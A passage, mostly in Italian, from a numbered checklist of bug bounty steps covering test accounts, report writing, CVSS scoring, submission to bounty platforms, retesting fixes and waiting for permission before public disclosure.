3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
